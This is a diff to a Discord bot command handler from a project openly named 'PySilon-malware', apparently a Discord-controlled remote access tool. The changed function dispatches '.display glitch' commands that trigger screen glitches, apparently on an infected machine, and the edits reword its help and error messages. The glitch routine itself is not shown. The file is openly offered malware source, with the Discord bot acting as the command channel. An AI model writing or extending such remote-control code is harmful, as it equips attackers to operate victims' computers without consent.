@@ -34,7 +34,7 @@ async def screen_manipulation(ctx, option=None):
 
     elif option == 'glitch':
         if ctx.message.content[16:] == 'list':
-            embed = discord.Embed(title="📃 List of currently available glitches:", description=f'- {"- ".join(flash_screen("list"))}\n`NOTE: This list will dramatically increase it\'s size in release v4.1`', colour=discord.Colour.blue())
+            embed = discord.Embed(title="📃 List of currently available glitches:", description=f'- {"- ".join(flash_screen("list"))}', colour=discord.Colour.blue())
             embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
             await ctx.send(embed=embed)
         elif ctx.message.content[16:] + '\n' in flash_screen('list'):
@@ -43,12 +43,12 @@ async def screen_manipulation(ctx, option=None):
             embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
             await ctx.send(embed=embed)
         else:
-            embed = discord.Embed(title="📛 Error",description='```Syntax: .display-glitch <glitch_name>\nTo list all currently available glitches, type .display-glitch list```', colour=discord.Colour.red())
+            embed = discord.Embed(title="📛 Error",description='```Syntax: .display glitch <glitch_name>\nTo list all currently available glitches, type .display-glitch list```', colour=discord.Colour.red())
             embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
             await ctx.send(embed=embed)
 
     else:
-        embed = discord.Embed(title="📛 Error",description='```Syntax: .display <graphic / glitch>```', colour=discord.Colour.red())
+        embed = discord.Embed(title="📛 Error",description='```Syntax: .display <graphic / glitch> <other options>```', colour=discord.Colour.red())
         embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
         await ctx.send(embed=embed)
 
